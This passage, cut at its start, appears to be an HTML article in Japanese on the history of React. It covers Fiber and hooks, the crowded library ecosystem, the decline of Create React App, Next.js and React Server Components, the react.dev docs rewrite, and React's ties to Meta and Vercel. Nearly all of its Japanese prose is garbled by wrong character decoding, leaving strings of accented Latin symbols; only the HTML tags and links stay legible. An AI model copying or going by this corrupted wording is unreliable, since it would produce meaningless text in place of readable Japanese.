ã«ã‚‚å¯¾å¿œå¯èƒ½ã«ãªã‚Šã¾ã—ãŸã€‚å†…éƒ¨ã¯æ–°ã—ã„ã€ŒFiberã€ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã«å®Œå…¨ã«æ›¸ãç›´ã•ã‚Œã€ã•ã‚‰ãªã‚‹ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã®å¤‰æ›´ãŒå¯èƒ½ã«ãªã‚Šã¾ã—ãŸã€‚2018å¹´ã®ãƒ•ãƒƒã‚¯ã®ãƒªãƒªãƒ¼ã‚¹ã«ã‚ˆã‚Šã€é–¢æ•°ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã¯stateã¨å‰¯ä½œç”¨ã‚’æŒã¤èƒ½åŠ›ã‚’å¾—ã¾ã—ãŸã€‚</p>
<p>é•·å¹´ã€Reactã¯UIã«ç‰¹åŒ–ã—ãŸæœ€å°é™ã®ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã¨ã—ã¦è‡ªã‚‰ã‚’ä½ç½®ã¥ã‘ã¦ã„ã¾ã—ãŸï¼ˆã€ŒMVCã®Vã€ã€ã€Œãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¤ãƒ³ã‚¿ãƒ•ã‚§ãƒ¼ã‚¹ã‚’æ§‹ç¯‰ã™ã‚‹ãŸã‚ã®JSãƒ©ã‚¤ãƒ–ãƒ©ãƒªã€ï¼‰ã€‚Angularã‚„Emberã®ã‚ˆã†ãªä»–ã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¯å®Œå…¨ã«ã€Œå…¨éƒ¨å…¥ã‚Šï¼ˆbatteries includedï¼‰ã€ã§ã€ã‚¢ãƒ—ãƒªã®æ§‹ç¯‰æ–¹æ³•ã‚„æ§‹é€ ã«ã¤ã„ã¦å¼·ã„æ„è¦‹ã‚’æŒã£ã¦ã„ã¾ã—ãŸãŒã€Reactãƒãƒ¼ãƒ ã¯ãã‚Œã‚‰å…¨ã¦ã‚’ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã«å§”ã­ã¦ã„ã¾ã—ãŸã€‚ã“ã‚Œã¯ã€è‰¯ãã‚‚æ‚ªãã‚‚ã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ã®å¤§çˆ†ç™ºã«ã¤ãªãŒã‚Šã¾ã—ãŸã€‚è€ƒãˆã‚‰ã‚Œã‚‹ã‚ã‚‰ã‚†ã‚‹ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚«ãƒ†ã‚´ãƒªã§ã€é‡è¤‡ã™ã‚‹å•é¡Œã‚’è§£æ±ºã™ã‚‹ä½•åã‚‚ã®ç«¶åˆãƒ„ãƒ¼ãƒ«ãŒå­˜åœ¨ã—ã¾ã—ãŸã€‚çŠ¶æ…‹ç®¡ç†ï¼ˆReduxã€Mobxã€Zustand...ï¼‰ã€CSSã¨ã‚¹ã‚¿ã‚¤ãƒ«ï¼ˆStyled-Componentsã€Emotionã€CSS Modules...ï¼‰ã€ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒï¼ˆReact Queryã€Apolloã€SWRã€RTK Query...ï¼‰ã€ãƒ“ãƒ«ãƒ‰ãƒ„ãƒ¼ãƒ«ï¼ˆBabelã€Webpackã€ESBuildã€Viteã€Parcel...ï¼‰ã€ãã®ä»–æ•°ç™¾ã§ã™ã€‚</p>
<p>Reactãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯å¸¸ã«ã€ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’é–‹å§‹ã™ã‚‹éš›ã«ã€ã‚¢ãƒ—ãƒªã®ã•ã¾ã–ã¾ãªãƒ¦ãƒ¼ã‚¹ã‚±ãƒ¼ã‚¹ã‚’è§£æ±ºã™ã‚‹ãŸã‚ã®ä¸€é€£ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’é¸ã³å‡ºã™å¿…è¦ãŒã‚ã‚Šã¾ã—ãŸã€‚ã•ã‚‰ã«ã€Reactã¯å¤šãã®æ–¹æ³•ã§ä½¿ç”¨ã§ãã¾ã—ãŸã€‚ã‚·ãƒ³ã‚°ãƒ«ãƒšãƒ¼ã‚¸ã‚¢ãƒ—ãƒªï¼ˆSPAï¼‰ã§ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã§å…¨ã¦ã®è¦ç´ ã‚’ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã™ã‚‹ã€ã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã•ã‚ŒãŸãƒšãƒ¼ã‚¸ã«è¤‡æ•°ã®ã‚µãƒ–ãƒ„ãƒªãƒ¼ã‚’ã‚¢ã‚¿ãƒƒãƒã™ã‚‹ã€ãƒãƒ«ãƒãƒšãƒ¼ã‚¸ã‚¢ãƒ—ãƒªï¼ˆMPAï¼‰ã®ä¸€éƒ¨ã¨ã—ã¦ã‚µãƒ¼ãƒãƒ¼ä¸Šã§ä½¿ç”¨ã™ã‚‹ãªã©ã€å¤šå²ã«ã‚ãŸã‚Šã¾ã™ã€‚ã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã®æŸ”è»Ÿæ€§ã¨å¤šæ§˜æ€§ã¯ã€å¼·ã¿ã§ã‚ã‚‹ã¨åŒæ™‚ã«å¼±ã¿ã§ã‚‚ã‚ã‚Šã¾ã—ãŸã€‚ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã«å¿…è¦ãªãƒ„ãƒ¼ãƒ«ã®æ­£ç¢ºãªçµ„ã¿åˆã‚ã›ã‚’é¸ã¶ã“ã¨ãŒã§ãã‚‹ä¸€æ–¹ã§ã€ãƒ„ãƒ¼ãƒ«ã®çµ„ã¿åˆã‚ã›ã‚’é¸ã°ãªã‘ã‚Œã°ãªã‚‰ãªã„ã®ã§ã™ã€‚ãã‚Œã¯æ±ºå®šç–²ã‚Œã€ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã®ã‚³ãƒ¼ãƒ‰ãƒ™ãƒ¼ã‚¹ã®ã°ã‚‰ã¤ãã€ãã—ã¦ä¸€èˆ¬çš„ã«ä½¿ç”¨ã•ã‚Œã‚‹ãƒ„ãƒ¼ãƒ«ã®çµ¶ãˆé–“ãªã„å¤‰åŒ–ã«ã¤ãªãŒã‚Šã¾ã™ã€‚</p>
<p>å…¨ä½“ã¨ã—ã¦ã€Reactãƒ©ã‚¤ãƒ–ãƒ©ãƒªã¨Reactãƒãƒ¼ãƒ ã®ä¸¡æ–¹ãŒæ„å›³çš„ã«æ„è¦‹ã‚’æŒãŸãªã„ï¼ˆunopinionatedï¼‰å§¿å‹¢ã‚’ä¿ã£ã¦ã„ã¾ã—ãŸã€‚å½¼ã‚‰ã¯ã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ å†…ã®ç‰¹å®šã®ãƒ„ãƒ¼ãƒ«ã‚’ãˆã“ã²ã„ãã—ãŸããªãã€å½¼ã‚‰ã®æ™‚é–“ã¨æ³¨æ„ã¯Reactè‡ªä½“ã®æ§‹ç¯‰ã«é›†ä¸­ã—ã¦ãŠã‚Šã€Reactã®ã‚¹ã‚³ãƒ¼ãƒ—ã‚’ã‚ã‚‹ç¨‹åº¦ç‹­ã„ã‚‚ã®ã¨è¦‹ãªã—ã¦ã„ã¾ã—ãŸã€‚</p>
<p>ãã®ã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ã®å¤šæ§˜æ€§ã¯æŸ”è»Ÿæ€§ã‚’ã‚‚ãŸã‚‰ã—ã¾ã—ãŸãŒã€åŒæ™‚ã«è¤‡é›‘ã•ã‚‚ç”Ÿã¿å‡ºã—ã¾ã—ãŸã€‚ã“ã‚Œã¯ç‰¹ã«ãƒ“ãƒ«ãƒ‰ãƒ„ãƒ¼ãƒ«ã§é¡•è‘—ã§ã—ãŸã€‚åˆæœŸã®Reactãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã§ã¯ã€æœ€åˆã®Reactã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’æ›¸ãå‰ã«ã€ã€ŒWebpackã¨Babelã®è¨­å®šæ–¹æ³•ã€ã‚’èª¬æ˜ã™ã‚‹ãŸã‚ã«ä½•ãƒšãƒ¼ã‚¸ã‚‚è²»ã‚„ã™ã“ã¨ãŒã‚ˆãã‚ã‚Šã¾ã—ãŸã€‚ã“ã®ãŸã‚Reactãƒãƒ¼ãƒ ã¯ã€Create React Appï¼ˆCRAï¼‰ã¨å‘¼ã°ã‚Œã‚‹ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸åŒ–æ¸ˆã¿ã®ãƒ“ãƒ«ãƒ‰ãƒ„ãƒ¼ãƒ«è¨­å®šã‚’æ§‹ç¯‰ã™ã‚‹ã“ã¨ã«ãªã‚Šã¾ã—ãŸã€‚CRAã¯ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‹ã‚‰æ–°ã—ã„Reactãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’ç”Ÿæˆã§ãã‚‹CLIãƒ„ãƒ¼ãƒ«ã§ã‚ã‚Šã€éå¸¸ã«è¤‡é›‘ã§ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºã•ã‚ŒãŸWebpack + Babelè¨­å®šã§æ§‹ç¯‰ã•ã‚Œã¦ã„ã¾ã—ãŸã€‚ã“ã‚Œã¯ã€å˜ä¸€ã®ã‚³ãƒãƒ³ãƒ‰ã§æ–°ã—ã„ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’ç°¡å˜ã«å§‹ã‚ã‚‰ã‚Œã‚‹ã‚ˆã†ã«è¨­è¨ˆã•ã‚Œã¦ã„ã¾ã—ãŸã€‚ãã®è¨­å®šã¯ã€è¤‡é›‘ã•ã‚’éš ã™ãŸã‚ã«ãƒ–ãƒ©ãƒƒã‚¯ãƒœãƒƒã‚¯ã‚¹ã¨ã—ã¦ã‚«ãƒ—ã‚»ãƒ«åŒ–ã•ã‚Œã¦ã„ã¾ã—ãŸã€‚</p>
<p>Reactã«ã¯ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒã®çµ„ã¿è¾¼ã¿ãƒ¡ã‚½ãƒƒãƒ‰ãŒãªã‹ã£ãŸãŸã‚ã€ãƒ‡ãƒ¼ã‚¿ã‚’ãƒ•ã‚§ãƒƒãƒã—ã¦ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã™ã‚‹ãŸã‚ã«ã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ä½¿ç”¨ã™ã‚‹ã®ãŒæ¨™æº–ã§ã—ãŸã€‚Reactã«ã¯æ—©ãã‹ã‚‰ã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ï¼ˆSSRï¼‰æ©Ÿèƒ½ãŒã‚ã‚Šã€Reactã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãƒ„ãƒªãƒ¼ã‚’HTMLæ–‡å­—åˆ—ã‚„ã‚¹ãƒˆãƒªãƒ¼ãƒ ã¨ã—ã¦ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã™ã‚‹ãƒ¡ã‚½ãƒƒãƒ‰ãŒã‚ã‚Šã¾ã—ãŸãŒã€ã“ã‚Œã‚‰ã¯ã‚µãƒ¼ãƒãƒ¼ãƒãƒ³ãƒ‰ãƒ©ã§æ‰‹å‹•ã§ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã—ãŸã€‚æ™‚ãŒçµŒã¤ã«ã¤ã‚Œã¦ã€ä»–ã®ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸æ¸ˆã¿ã®Reactãƒ“ãƒ«ãƒ‰ã‚·ã‚¹ãƒ†ãƒ ã‚„ã€Œãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã€ãŒäººæ°—ã‚’åšã—ã¾ã—ãŸã€‚Next.jsã‚‚Webpackã‚’ãƒ©ãƒƒãƒ—ã—ã¾ã—ãŸãŒã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ãƒ™ãƒ¼ã‚¹ã®ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°è¦ç´„ã«ã‚ˆã‚‹çµ„ã¿è¾¼ã¿ã®ã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã‚„ãƒšãƒ¼ã‚¸ãƒ™ãƒ¼ã‚¹ã®ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒãªã©ã€ã‚ˆã‚Šå¤šãã®æ©Ÿèƒ½ã‚’è¿½åŠ ã—ã¾ã—ãŸã€‚Gatsbyã¯GraphQLãƒ™ãƒ¼ã‚¹ã®ãƒ‡ãƒ¼ã‚¿ã‚½ãƒ¼ã‚¹ã‹ã‚‰ã‚µã‚¤ãƒˆã‚’ç”Ÿæˆã—ã¾ã—ãŸã€‚å¾Œã«ã€Remixã¯ã‚µãƒ¼ãƒãƒ¼ã®ã€Œãƒ‡ãƒ¼ã‚¿ãƒ­ãƒ¼ãƒ€ãƒ¼ã€ã‚’è¿½åŠ ã—ã€ã‚ˆã‚ŠHTML/ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ãƒ™ãƒ¼ã‚¹ã®ä½¿ç”¨è¦ç´„ã‚’æ¨é€²ã—ã¾ã—ãŸã€‚</p>
<p>2020å¹´å¾ŒåŠã€Reactãƒãƒ¼ãƒ ã¯ã€ŒReact Server Componentsã€ã®ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ã‚’ç™ºè¡¨ã—ã¾ã—ãŸã€‚ã“ã‚Œã¯ã€éåŒæœŸReactã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒã‚µãƒ¼ãƒãƒ¼ä¸Šã§å®Ÿè¡Œã•ã‚Œã¦ãƒ‡ãƒ¼ã‚¿ã‚’ãƒ•ã‚§ãƒƒãƒã—ã€ãã®å¾Œå­ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã—ã¦å­ã¨ãƒ‡ãƒ¼ã‚¿ã‚’ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹Reactã«æ¸¡ã™ã“ã¨ã‚’å¯èƒ½ã«ã™ã‚‹ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£çš„ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã§ã—ãŸã€‚ã“ã‚Œã¯ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒã«å¯¾ã™ã‚‹Reactã‚‰ã—ã„è§£æ±ºç­–ã¨ã—ã¦æ„å›³ã•ã‚Œã¦ãŠã‚Šã€Reactã®å½“åˆã®ã€Œã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆä¸Šã®ãƒ“ãƒ¥ãƒ¼ã ã‘ã€ã¨ã„ã†æ­´å²çš„ãªå£²ã‚Šæ–‡å¥ã‹ã‚‰ã®å¤§ããªè»¢æ›ã‚’ç¤ºã—ã¾ã—ãŸã€‚RSCã®é–‹ç™ºä¸­ã«ã€Reactã‚³ã‚¢ãƒãƒ¼ãƒ ã®ãƒ¡ãƒ³ãƒãƒ¼ã®ä¸€éƒ¨ãŒMetaã‚’å»ã‚Šã€Next.jsã®é–‹ç™ºå…ƒã§ã‚ã‚‹Vercelã«å‚åŠ ã—ã¾ã—ãŸã€‚å½¼ã‚‰ã¯åˆæœŸã®RSCå®Ÿè£…ã®æ§‹ç¯‰ã‚’ç¶šã‘ã€Nexté–‹ç™ºãƒãƒ¼ãƒ ã¨å”åŠ›ã—ã¦æ–°ã—ã„ã€ŒApp Routerã€ã§Nextã‚’å†è¨­è¨ˆã—ã¾ã—ãŸã€‚ã“ã‚Œã¯RSCã®æœ€åˆã®æœ¬ç•ªå®Ÿè£…ã§ã—ãŸã€‚</p>
<p>Reactãƒãƒ¼ãƒ ã¯ã¾ãŸã€2020å¹´ã‹ã‚‰2023å¹´ã«ã‹ã‘ã¦Reactã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚µã‚¤ãƒˆã‚’ã‚¼ãƒ­ã‹ã‚‰å®Œå…¨ã«æ›¸ãç›´ã—ã¾ã—ãŸã€‚<a href="https://react.dev/">react.dev</a>ã«ã‚ã‚‹æ–°ã—ã„Reactãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã«ã¯ã€Reactã®ã‚³ãƒ³ã‚»ãƒ—ãƒˆã‚’æ®µéšçš„ã«è§£èª¬ã™ã‚‹ç´ æ™´ã‚‰ã—ã„ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ãŒã‚ã‚Šã€å®Ÿè¡Œå¯èƒ½ãªã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹å†…ã«å¤šæ•°ã®ãƒšãƒ¼ã‚¸å†…ã‚µãƒ³ãƒ—ãƒ«ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã»ã‹ã€APIãƒªãƒ•ã‚¡ãƒ¬ãƒ³ã‚¹ãƒšãƒ¼ã‚¸ã‚‚å¤§å¹…ã«æ”¹å–„ã•ã‚Œã¦ã„ã¾ã™ã€‚</p>
<p>æ–°ã—ã„ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆãŒå…¬é–‹ã•ã‚ŒãŸã¨ãã€Reactãƒãƒ¼ãƒ ã¯Reactã®æ¨å¥¨ã•ã‚Œã‚‹ä½¿ç”¨æ–¹æ³•ã‚’å¤§ããè»¢æ›ã—ã¾ã—ãŸã€‚ä»¥å‰ã¯ã€å¤ã„Reactãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã¯ã€<a href="https://legacy.reactjs.org/docs/create-a-new-react-app.html#recommended-toolchains">å­¦ç¿’ä¸­ã¾ãŸã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã®SPAã‚’æ§‹ç¯‰ã—ã¦ã„ã‚‹å ´åˆã«ã¯CRAã‹ã‚‰å§‹ã‚ã‚‹</a>ã“ã¨ã‚’æ¨å¥¨ã—ã€SSRã‚„é™çš„ã‚µã‚¤ãƒˆãŒå¿…è¦ãªå ´åˆã«ã¯Nextã‚„Gatsbyã®ã‚ˆã†ãªä»–ã®ã„ãã¤ã‹ã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’æŒ‡ã—ç¤ºã—ã¦ã„ã¾ã—ãŸã€‚æ–°ã—ã„ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã§ã€Reactãƒãƒ¼ãƒ ã¯ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã‚’å¤‰æ›´ã—ã€ã€ŒReactã‚¢ãƒ—ãƒªã‚’æ›¸ããŸã‚ã«ã¯ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’ä½¿ã†ã¹ãã  - ãã‚Œã‚‰ã«ã¯ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã€ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒã€ãƒ“ãƒ«ãƒ‰æ©Ÿèƒ½ãŒçµ„ã¿è¾¼ã¾ã‚Œã¦ã„ã‚‹ã€ã¨æ˜ç¢ºã‹ã¤å¼·ãæ¨å¥¨ã—å§‹ã‚ã¾ã—ãŸã€‚ã“ã‚Œã¯RSCã‚’æ§‹ç¯‰ã™ã‚‹ä½œæ¥­ã«ã‚‚é–¢é€£ã—ã¦ã„ã¾ã—ãŸã€‚ã“ã®ä¸€ç’°ã¨ã—ã¦ã€<a href="https://web.archive.org/web/20250125034212/https://react.dev/learn/start-a-new-react-project">ã€Œæ–°ã—ã„Reactãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’å§‹ã‚ã‚‹ã€ãƒšãƒ¼ã‚¸</a>ã§ã¯ã€ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ãªã—ã§Reactã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã«å¯¾ã—ã¦æ˜ç¢ºã«è­¦å‘Šã—ã¦ã„ã¾ã—ãŸã€‚Nextã¯ãã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆãƒšãƒ¼ã‚¸ã§ç›®ç«‹ã¤ã‚ˆã†ã«è¨˜è¼‰ã•ã‚Œã¦ã„ã¾ã—ãŸ - ã€Œãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã€ãƒªã‚¹ãƒˆã®æœ€åˆã«ï¼ˆPagesãƒ«ãƒ¼ã‚¿ãƒ¼ã«ã¤ã„ã¦ï¼‰é †åºä»˜ã‘ã‚‰ã‚Œã€ã•ã‚‰ã«ä¸‹ã§å”¯ä¸€åˆ©ç”¨å¯èƒ½ãªRSCå®Ÿè£…ã¨ã—ã¦è¨€åŠã•ã‚Œã¦ã„ã¾ã—ãŸã€‚Vercelã§åƒãReactãƒãƒ¼ãƒ ã®ãƒ¡ãƒ³ãƒãƒ¼ã¯ã€<a href="https://x.com/acdlite/status/1549853625673023488">ã€Œæ¥ã‚‹ã¹ãNext.jsã®ãƒªãƒªãƒ¼ã‚¹ã‚’ã€æœ¬å½“ã®ã€React 18ã®ãƒªãƒªãƒ¼ã‚¹ã ã¨è€ƒãˆã¦ã„ã‚‹ã€</a>ã¨è¿°ã¹ãŸã¨å¼•ç”¨ã•ã‚Œã¦ã„ã¾ã™ã€‚</p>
<p>ã“ã‚Œã¯ã€Create React AppãŒ2022å¹´é ƒã«äº‹å®Ÿä¸Šéæ¨å¥¨ã«ãªã£ãŸã“ã¨ã¨é–¢é€£ã—ã¦ã„ã¾ã—ãŸã€‚ãã‚Œä»¥å‰ã‹ã‚‰ã—ã°ã‚‰ããƒ¡ãƒ³ãƒ†ãƒŠãƒ³ã‚¹ã•ã‚Œã¦ã„ã¾ã›ã‚“ã§ã—ãŸã€‚ã€ŒCRAã‚’éæ¨å¥¨ã¨ã—ã¦ãƒãƒ¼ã‚¯ã—ã€Viteã‚’æ¨å¥¨ã™ã‚‹ã€ã¨ã„ã†PRãŒæå‡ºã•ã‚ŒãŸã¨ãã€Dan Abramovã¯CRAãŒä½œæˆã•ã‚ŒãŸç†ç”±ã€<a href="https://github.com/reactjs/react.dev/pull/5487#issuecomment-1409720741">CRAã®å•é¡Œç‚¹ã€ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã®å°é ­ã€ãã—ã¦Reactã®ãƒ“ã‚¸ãƒ§ãƒ³ã®è»¢æ›ã«ã¤ã„ã¦</a>è©³ç´°ãªã‚³ãƒ¡ãƒ³ãƒˆã‚’æ›¸ãã¾ã—ãŸã€‚ã“ã‚Œã«å¿œãˆã¦ã€Reactã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã¯ä¸€æ–‰ã«CRAã‹ã‚‰ç§»è¡Œã—ã€ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚‚ãã‚Œã‚’æ¨å¥¨ã™ã‚‹ã®ã‚’ã‚„ã‚ã¾ã—ãŸãŒã€å…¬å¼ã«ã€Œéæ¨å¥¨ã€ã¨ãƒãƒ¼ã‚¯ã™ã‚‹ãŸã‚ã®æªç½®ã¯ä½•ã‚‚å–ã‚‰ã‚Œã¾ã›ã‚“ã§ã—ãŸã€‚</p>
<h2>Reactã¨ãã®ã‚ªãƒ¼ãƒŠãƒ¼ã¨ã®é–¢ä¿‚</h2>
<p>ä»Šæ—¥ã€Reactã®é–‹ç™ºä½œæ¥­ã¯2ã¤ã®ä¼æ¥­ã«ã‚ˆã£ã¦å¾Œæ´ã•ã‚Œã€æ‰€æœ‰ã•ã‚Œã¦ã„ã¾ã™ã€‚Metaï¼ˆæ—§Facebookï¼‰ã¨Vercelã§ã™ã€‚</p>
<h3>Facebook / Meta</h3>
<p>å½“åˆã‹ã‚‰ã€Reactã¯Facebook/MetaãŒæ‰€æœ‰ã™ã‚‹ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã§ã—ãŸã€‚ã‚³ãƒ¼ãƒ‰ã¯ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹åŒ–ã•ã‚Œã€èª°ã§ã‚‚PRã‚’æå‡ºã§ãã¾ã—ãŸãŒã€æœ¬è³ªçš„ã«é–‹ç™ºä½œæ¥­ã¯å…¨ã¦Metaã®Reactãƒãƒ¼ãƒ ã«ã‚ˆã£ã¦è¡Œã‚ã‚Œã¦ã„ã¾ã—ãŸã€‚</p>
<p>ã“ã‚Œã¯Reactã®é–‹ç™ºæ–¹æ³•ã«å¤§ããªå½±éŸ¿ã‚’ä¸ãˆã¾ã—ãŸã€‚Reactã‚³ã‚¢ãƒãƒ¼ãƒ ã®ä¼šè­°ã¯é€šå¸¸å†…éƒ¨ã§è¡Œã‚ã‚Œã€ãƒ­ãƒ¼ãƒ‰ãƒãƒƒãƒ—ã‚‚åŒæ§˜ã§ã—ãŸã€‚Reactãƒãƒ¼ãƒ ã¯ã—ã°ã—ã°å•é¡Œé ˜åŸŸã«å¯¾ã—ã¦åŠãƒ€ãƒ¼ã‚¹ã»ã©ã®ã‚¢ã‚¤ãƒ‡ã‚¢ã‚’ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ã—ã€ãã‚Œã‚’Metaã®ã‚¢ãƒ—ãƒªãƒãƒ¼ãƒ ã«è©¦ã—ã¦ã‚‚ã‚‰ã£ã¦æ¤œè¨¼ã—ã¾ã—ãŸã€‚æ–°ã—ã„Reactæ©Ÿèƒ½ãŒç™ºè¡¨ã•ã‚Œã‚‹é ƒã«ã¯ã€ãã‚Œã¯å¤šãã®å†…éƒ¨ã‚¤ãƒ†ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã‚’çµŒã¦ã€å®Ÿéš›ã®ä½¿ç”¨ã§æ¤œè¨¼ã•ã‚Œã¦ã„ã¾ã—ãŸã€‚åŒæ™‚ã«ã€Reactãƒãƒ¼ãƒ ã¯Metaã®ã‚¢ãƒ—ãƒªãƒãƒ¼ãƒ ã®ãƒã‚°ä¿®æ­£ã‚„ãã®ä»–ã®ã‚µãƒãƒ¼ãƒˆã«ã‚‚è²¬ä»»ã‚’è² ã£ã¦ãã¾ã—ãŸã€‚</p>
<p>ãã‚Œã«ã‚‚ã‹ã‹ã‚ã‚‰ãšã€Reactãƒãƒ¼ãƒ ã¯ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®é–‹ç™ºæ–¹æ³•ã«ãŠã„ã¦ã‹ãªã‚Šè‡ªç”±ãªè£é‡ã‚’æŒã£ã¦ãã¾ã—ãŸã€‚Reactã¯Facebookå†…éƒ¨ã§Facebookã®ãŸã‚ã«ä½œã‚‰ã‚Œã¾ã—ãŸãŒã€Reactãƒãƒ¼ãƒ è‡ªèº«ãŒãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®å‹•ä½œæ–¹æ³•ã«é–¢ã™ã‚‹ãƒ­ãƒ¼ãƒ‰ãƒãƒƒãƒ—ã¨é•·æœŸãƒ“ã‚¸ãƒ§ãƒ³ã‚’æ±ºå®šã—ã¦ãã¾ã—ãŸã€‚ã»ã¨ã‚“ã©ã®å ´åˆã€Reactã®å®Ÿéš›ã®é–‹ç™ºãƒ—ãƒ­ã‚»ã‚¹ã¨ãƒ­ãƒ¼ãƒ‰ãƒãƒƒãƒ—ã¯ã€Facebook/Metaå†…éƒ¨ã®ä»–ã®å½±éŸ¿åŠ›ã«ã‚ˆã£ã¦ã§ã¯ãªãã€å½¼ã‚‰è‡ªèº«ã«ã‚ˆã£ã¦æ¨é€²ã•ã‚Œã¦ãã¾ã—ãŸã€‚ã¨ã¯ã„ãˆã€å½¼ã‚‰ã¯è‡ªåˆ†ãŸã¡ã®æ¥­ç¸¾ã¨ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆãŒMetaã«ã©ã®ã‚ˆã†ã«åˆ©ç›Šã‚’ã‚‚ãŸã‚‰ã™ã‹ã‚’æ­£å½“åŒ–ã™ã‚‹å¿…è¦ã‚‚ã‚ã‚Šã¾ã™ã€‚</p>
